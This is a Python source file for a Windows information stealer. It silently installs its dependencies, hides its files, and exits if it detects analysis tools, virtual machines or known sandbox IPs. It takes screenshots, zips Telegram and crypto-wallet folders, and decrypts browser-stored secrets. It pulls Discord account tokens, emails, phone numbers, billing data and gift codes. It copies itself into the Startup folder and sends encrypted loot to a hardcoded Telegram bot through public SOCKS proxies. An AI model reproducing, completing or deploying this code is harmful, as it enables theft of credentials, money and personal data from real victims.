import subprocess
import sys
import time

# List of modules to check for installation
ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in sys.executable else 'Crypto'],
    ["requests", "requests"],
    ["psutil", "psutil"],
    ["Pillow", "Pillow"],  # PIL is now Pillow
    ["wmi", "WMI"],
    ["win32crypt", "pywin32"],
]

# Check and install missing modules
for module in ModuleRequirements:
    try:
        __import__(module[0])
    except ImportError:
        subprocess.Popen(f"\"{sys.executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(0)  # Wait for the installation to finish before proceeding
import os
import re
import shutil,socket
import winreg
import platform,zipfile
import win32crypt
from datetime import datetime
import uuid,wmi
import ctypes
#pip install pysocks#important
import ctypes as ct
#import winreg
import json, locale
from configparser import ConfigParser
from typing import Optional, Iterator 
import winreg
import requests
import random
import warnings
import threading,psutil,sqlite3
from PIL import ImageGrab
from base64 import b64decode
from json import loads
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
import string
from threading import Thread
import concurrent.futures
from zipfile import ZipFile, ZIP_DEFLATED
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import ssl
ssl._create_default_https_context = ssl._create_unverified_context


# Suppress warnings and errors
class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

# List of modules to check for installation

# Telegram API configuration
BOT_TOKEN = "7351710792:AAFcFQprcRfvrh4Ujs9UyJUM83QttV3JmHQ"
CHAT_ID = 6400572573
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
CHANNEL_ID = "-1002481960370"
def exit_program(reason):
    #print(reason)
    ctypes.windll.kernel32.ExitProcess(0)
    sys.exit()
def create_temp_resources():
    def get_random_string(length=8, alphanumeric=False):
        chars = string.ascii_letters + string.digits if alphanumeric else string.ascii_letters
        return ''.join(random.choices(chars, k=length))

    temp_dir = os.getenv('temp')

    # Ensure unique archive file
    while True:
        archive_path = os.path.join(temp_dir, get_random_string() + '.zip')
        if not os.path.isfile(archive_path):
            break

    # Ensure unique temporary folder
    while True:
        temp_folder = os.path.join(temp_dir, get_random_string(10, True))
        if not os.path.isdir(temp_folder):
            os.makedirs(temp_folder, exist_ok=True)
            break

    #print(f'Archive Path: {archive_path}')
    #print(f'Temporary Folder: {temp_folder}')
    try:
        subprocess.Popen(['attrib', '+h', temp_folder], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, close_fds=True)
        subprocess.Popen(['attrib', '+h', archive_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, close_fds=True)
        subprocess.Popen(['attrib', '+h', os.path.realpath(__file__)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, close_fds=True)
    except:pass
    
    return archive_path, temp_folder

ArchivePath,TempFolder=create_temp_resources()


def find_antivirus_folders(base_folder):
    antivirus_names = [
        "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "Sophos", 
        "ESET", "Malwarebytes", "Avira", "Panda", "Trend Micro", "F-Secure", "Comodo",
        "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", 
        "ClamWin", "ZoneAlarm", "Cylance", "Webroot", "Palo Alto Networks", "Symantec", 
        "SentinelOne", "CrowdStrike", "Emsisoft", "HitmanPro", "Fortinet", "FireEye", 
        "Zemana", "Windows Defender", "Qihoo 360", "AhnLab-V3", "Alibaba", "Arcabit", 
        "Baidu", "CMC", "Cybereason", "Jiangmin", "Kingsoft", "MaxSecure", "Quick Heal", 
        "Rising", "SUPERAntiSpyware", "Tencent", "Trustlook", "VBA32", "Zoner"
    ]

    antivirus_folders_dict = {}

    for folder in os.listdir(base_folder):
        full_path = os.path.join(base_folder, folder)

        if os.path.isdir(full_path):
            for antivirus_name in antivirus_names:
                if antivirus_name.lower() in folder.lower():
                    antivirus_folders_dict[antivirus_name] = folder

    return antivirus_folders_dict

def anti_viruse():
    base_folders = ["C:\\Program Files", "C:\\Program Files (x86)"]

    found_antivirus = {}
    for base_folder in base_folders:
        if os.path.exists(base_folder):
            found_antivirus.update(find_antivirus_folders(base_folder))

    if not "Windows Defender" in found_antivirus.keys():
        exit_program('win defender not found')

anti_viruse()
# Blacklisted values
BLACKLISTED_HOSTNAMES = [
    "BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80",
    "WIN-5E07COS9ALR", "B30F0242-1C6A-4","Q9IATRKPRH",
    "XC64ZB",
    "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "QarZhrdBpj", "ORELEEPC", 
    "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"
]
BLACKLISTED_USERNAMES = [
    "WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex",
    "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj",
    "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx",
    "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld",
    "od8m", "Julia", "HEUeRzl"
]

BLACKLISTED_PROCESSES = [
    "watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe",
    "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe",
    "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe",
    "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe",
    "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe",
    "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe",
    "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe",
    "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe",
    "OllyDbg.exe", "Wireshark.exe"
]
BLACKLISTED_IPS = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}

BLACKLISTED_DLLS = ["System32\\vmGuestLib.dll", "vboxmrxnp.dll"]

# Utility functions
def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result.strip()
    except:
        return ""

def check_blacklist(value, blacklist):
    return any(value.lower() == item.lower() for item in blacklist)


# Check functions
def check_hostname():
    hostname = os.getenv("COMPUTERNAME", "").strip()
    if check_blacklist(hostname, BLACKLISTED_HOSTNAMES):
        exit_program("Blacklisted hostname detected.")

def check_username():
    username = os.getlogin().strip()
    if check_blacklist(username, BLACKLISTED_USERNAMES):
        exit_program("Blacklisted username detected.")
        

def check_processes():
    processes = run_command("tasklist /FO CSV /NH").splitlines()
    for process in processes:
        if any(proc.lower() in process.lower() for proc in BLACKLISTED_PROCESSES):
            exit_program("Blacklisted process detected.")

def check_disk_serials():
    serials = run_command("wmic diskdrive get serialnumber").splitlines()
    for serial in serials:
        if serial.lower().startswith(("vb", "vm")):
            exit_program("Virtual disk detected.")

def check_dlls():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if any(os.path.exists(os.path.join(sys_root, dll)) for dll in BLACKLISTED_DLLS):
        exit_program("Blacklisted DLL detected.")

def check_ip():
        try:
            ip = requests.get('https://checkip.amazonaws.com', timeout=5).text.strip()
            if ip in BLACKLISTED_IPS:
                exit_program("Blacklisted IP detected.")
        except:
            pass

# Main function
def detection():
    checks = [
        check_hostname, check_username,
        check_processes, check_disk_serials, 
        check_dlls, check_ip
    ]
    threads = [threading.Thread(target=check) for check in checks]
    for thread in threads: thread.start()
    for thread in threads: thread.join()


detection()

LOCK_FILE=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'task.lock')

def remove_lock_file():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)


proxy_list = [
   {"http": "socks5://CB000:DH20@115.127.34.49:1080", "https": "socks5://CB000:DH20@115.127.34.49:1080"},
   {"http": "socks5://admin:admin@27.147.135.74:16626", 
  "https": "socks5://admin:admin@27.147.135.74:16626"},
    # Add more proxies as needed
]

# Function to fetch new proxies dynamically

# Function to test if a proxy is functional (optimized for speed)
def isProxyWorking(proxy, test_url="https://api.ipify.org?format=json"):
    try:
        response = requests.get(test_url, proxies=proxy, timeout=2)
        if response.status_code == 200:
            #print(f"Proxy working: {response.json().get('ip')}")
            return True
    except Exception as e:
        pass #print(f"Proxy failed: {e}")
    return False

def fetchNewProxies():
    #print("Fetching and testing new proxies...")
    try:
        # Sources for SOCKS5 proxies
        proxy_sources = [
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
            "https://www.socks-proxy.net/",
            "https://naawy.com/proxylist/socks5",
        ]

        # Fetch proxies from all sources
        proxies = []
        for url in proxy_sources:
            response = requests.get(url)
            if response.status_code == 200:
                proxies.extend(response.text.strip().split("\n"))

        # Prepare proxies
        proxy_list = [
            {"http": f"socks5://{proxy.strip()}", "https": f"socks5://{proxy.strip()}"}
            for proxy in proxies if proxy.strip()
        ]

        # Test proxies in parallel to find the fastest
        with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
            results = list(executor.map(isProxyWorking, proxy_list))

        # Filter working proxies
        working_proxies = [proxy for proxy, is_working in zip(proxy_list, results) if is_working]
        #print(f"Found {len(working_proxies)} working proxies.")
        return working_proxies

    except Exception as e:
        pass #print(f"Failed to fetch or test proxies: {e}")
        return []


# Function to get the best working proxy or fallback
def getWorkingProxy():
    global proxy_list

    # Check existing proxies first
    for proxy in proxy_list:
        if isProxyWorking(proxy):
            return proxy

    # Fetch and test new proxies
    #print("No working proxy found in existing list. Fetching new proxies...")
    proxy_list = fetchNewProxies()
    for proxy in proxy_list:
        if isProxyWorking(proxy):
            return proxy

    #print("No functional proxies found. Proceeding without a proxy.")
    return None

# Generalized function to send a request (image or document)
datasent=[]
def sendRequest(file_path, file_type,status, caption=None, retries=5, timeout=600):
    for attempt in range(1, retries + 1):
        proxy = getWorkingProxy()  # Get the best proxy or None
        try:
            #print (file_path)
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"File not found: {file_path}")
                return None

            with open(file_path, "rb") as f:
                file_size = os.path.getsize(file_path)
                if file_size > 50 * 1024 * 1024:
                    raise ValueError(f"{file_type.capitalize()} size exceeds Telegram's 50 MB limit.")

                files = {file_type: f}
                data = {"chat_id": CHAT_ID}
                if status:
                    data = {"chat_id": CHANNEL_ID}               
                if caption:
                    data["caption"] = caption

                url = f"{TELEGRAM_API_URL}/send{file_type.capitalize()}"
                #print(f"Attempting to send {file_type} (Attempt {attempt}) using proxy: {proxy}")
                response = requests.post(url, proxies=proxy, files=files, data=data, timeout=timeout)
                response_data = response.json()
                if response.status_code == 200 and response_data["ok"]:
                     response.raise_for_status()
                     datasent.append({"type": file_type, "path": file_path})
                     #print(f"{file_type.capitalize()} sent successfully!")
                     if status:
                         message_id = response_data["result"]["message_id"]
                         channel_id_trimmed = str(CHANNEL_ID).lstrip('-100')
                         channel_url = f"https://t.me/c/{channel_id_trimmed}/{message_id}"
                         return channel_url
                     return None
        except requests.ConnectionError:
            pass #print(f"Connection error during attempt {attempt}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            pass #print(f"Error during attempt {attempt}: {e}. Retrying...")
            time.sleep(2)

    #print(f"Failed to send {file_type} after {retries} attempts.")
    return None       
 
# Function to send text-only message
def sendTextMessage(text, retries=5):
    for attempt in range(1, retries + 1):
        proxy = getWorkingProxy()
        try:
            data = {"chat_id": CHAT_ID, "text": text}
            #print(f"Attempting to send text message (Attempt {attempt})...")
            response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=data, proxies=proxy, timeout=600)
            response.raise_for_status()
            datasent.append({"type": "text", "path": "defult/nopath"})
            #print("Text message sent successfully!")
            return
        except requests.ConnectionError:
            pass #print(f"Connection error during attempt {attempt}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            pass #print(f"Error during attempt {attempt}: {e}. Retrying...")
            time.sleep(2)

    #print(f"Failed to send text message after {retries} attempts.")

# Function to handle sending an image
def sendImage(image_path, caption):
    if not os.path.exists(image_path):
        #print(f"Image file does not exist: {image_path}. Sending caption as text.")
        sendTextMessage(caption)
        return

    sendRequest(image_path, "photo",False, caption)



def encrypt_zip_to_aes(zip_path: str, output_extension: str = ".aes") -> bool:
    try:
        aes_key = b'\x9a3;\x8d\xa5?~W\x1e\x9c\xce\x8d\xb6\xf1N\x10X\x9d`h\xf1\x14\xd0w\xde\xd1H\xbbu\x82\x11\x86'
        rsa_public_key=b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArAdpYQS3iE6J0JxWR9Es\niNczrXMrQsLvaMBvYGPzsIuys86TUft486z6AV0H8Bj9GGH76kGknfbWaYZQB7gw\nEiCxsop1tKcDckaZywAf1ugb+LrXn5fx+xAhB0/4uQSZnqM8WFDeJS5CSef25VfE\nu9MMbc3HNm4F0ZPOEwcoY8vmafdMYcXuH3DFi0zdjvqKB1dU5bySJMrN6LkG4Xj1\nMAujWjkfbo/Htbcprg2H8KKjbsz0950kvWZloqUdKAN7tWFCK6GMwGCMMnk6XT1X\nperW90rpmVIXIsgOGcAii9Tafkemw7AJcUUWdwPEiEC1fQA2g1ujh+n2ZsQ0IUcZ\nTwIDAQAB\n-----END PUBLIC KEY-----' 

        if not os.path.exists(zip_path):
            raise FileNotFoundError("The specified ZIP file does not exist.")

        if not zip_path.lower().endswith(".zip"):
            raise ValueError("The specified file is not a ZIP file.")

        # Encrypt the ZIP file using AES
        iv = get_random_bytes(16)
        with open(zip_path, "rb") as zip_file:
            zip_data = zip_file.read()
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
        padded_data = pad(zip_data, AES.block_size)
        encrypted_data = cipher_aes.encrypt(padded_data)
        rsa_cipher = PKCS1_OAEP.new(RSA.import_key(rsa_public_key))
        encrypted_aes_key = rsa_cipher.encrypt(aes_key)
        encrypted_file_path = os.path.splitext(zip_path)[0] + output_extension
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_aes_key)  # Write the encrypted AES key
            encrypted_file.write(iv + encrypted_data) 
        return True
    except Exception:
        return False





# Function to handle sending a ZIP file
def sendZip(zip_path, caption):
    if not os.path.exists(zip_path):
        #print(f"ZIP file does not exist: {zip_path}. Skipping.")
        return

    if not os.path.isfile(zip_path):
        #print(f"Provided path is not a file: {zip_path}. Skipping.")
        return

    if os.path.getsize(zip_path) == 0:
        #print(f"ZIP file is empty: {zip_path}. Skipping.")
        return
    if encrypt_zip_to_aes(zip_path):
        zip_pathC=zip_path.strip().split(".")[0]+".aes"
        
        sendRequest(zip_pathC, "document", False,caption)

# Threaded execution for concurrent sending
def threadedExecution(tasks):
    threads = []
    for task in tasks:
        thread = Thread(target=task["function"], args=task["args"])
        threads.append(thread)
        #thread.start()
    if len(threads) > 0:
     threads[0].start()
     threads[0].join()
    if len(threads) > 1:
     threads[1].start()
     threads[1].join()
    if len(threads) > 2:
     for thread in threads[2:]:
        thread.start()  # Wait for all threads to finish
     for thread in threads[2:]:
        thread.join()  # Wait for all threads to finish

    #print("All tasks completed. Exiting program.")

#uploaded tg



#upload end



def take_screenshot(save_path):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(save_path, "screenshot.png"))
    except Exception as e:pass

def threaded_screenshot():
    saveToDir = os.path.join(TempFolder)
    #os.makedirs(saveToDir, exist_ok=True)
    thread = threading.Thread(target=take_screenshot, args=(saveToDir,))
    thread.start()
    thread.join()

threaded_screenshot()



class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G371P():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def Z1PTG(foldername, target_dir):             
  if os.path.exists(target_dir):  
   if len(os.listdir(target_dir)) > 0:  
    saveToDir = os.path.join(TempFolder, 'Telegram')
    os.makedirs(saveToDir, exist_ok=True)    
    zip_file_path = os.path.join(saveToDir, foldername + '.zip')
    zipobj = ZipFile(zip_file_path, 'w', ZIP_DEFLATED)                  
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])
                
def Z1PF01D3r(foldername, target_dir):
  if os.path.exists(target_dir):
   if len(os.listdir(target_dir)) > 0:
 
    saveToDir = os.path.join(TempFolder, 'Wallets')
    os.makedirs(saveToDir, exist_ok=True)    
    zip_file_path = os.path.join(saveToDir, foldername + '.zip')
    zipobj = ZipFile(zip_file_path, 'w', ZIP_DEFLATED)                  
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def G108411NF0(ip):
    APIs = [
        "https://geolocation-db.com/jsonp/{}",  # First API
        "https://ipinfo.io/{}/json",            # Second API
    ]
    
    try:
        for api in APIs:
            try:
                ipdatanojson = urlopen(Request(api.format(ip))).read().decode()
                ipdata = loads(ipdatanojson)
                country = ipdata.get("country_name") or ipdata.get("country")
                country_code = ipdata.get("country_code", "").lower() if "country_code" in ipdata else ""
                region = ipdata.get("region", "") or ipdata.get("regionName", "")
                city = ipdata.get("city", "")
                if country:
                    globalinfo = f" {country}"
                    if region:
                        globalinfo += f", {region}"
                    if city:
                        globalinfo += f", {city}"
                    return globalinfo

            except Exception as e:
                continue
        return f""

    except Exception as e:
        return f""

        

def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def G37C0D35(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f"<:black_gift:1184971095003107451> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f"<:black_gift:1184971095003107451> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return "`None`"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends Found`"

def G37UHQ6U11D5(token):
    try:
        uhqguilds = ''
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 1: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:blackarrow:1095740975197995041> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == '': return '`No HQ Guilds Found`'
        return uhqguilds
    except:
        return 'No HQ Guilds Found'

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = ""

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "`None`"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

def Tr1M(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj
discordinfo=False
def UP104D70K3N(token, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)

    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else ""
    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = Tr1M(G37UHQFr13ND5(token))
    guilds = Tr1M(G37UHQ6U11D5(token))
    codes = Tr1M(G37C0D35(token))

    if codes == "": codes = "`No Gifts Found`"
    if billing == "": billing = ":lock:"
    if badge == "" and nitro == "": badge, nitro = ":lock:", ""
    if phone == "": phone = "`None`"
    if friends == "": friends = ":lock:"
    if guilds == "": guilds = ":lock:"
    path = path.replace("\\", "/")
    # Define changeable variables
    output = f"""

--- Embed ---
Author:
Name: {username}#{hashtag} ({idd})
Icon: {pfp}

Fields:
Token:
`{token}`

Email:
`{email}`

Phone:
`{phone}`

IP:
`{G371P()}`

Badges:
`{badge}`

Billing:
`{billing}`

HQ Friends:
`{friends}`

HQ Guilds:
`{guilds}`

Gift Codes:
`{codes}`

"""
    
    saveToDir = os.path.join(TempFolder, 'Message',"Discord")
    #print(output)
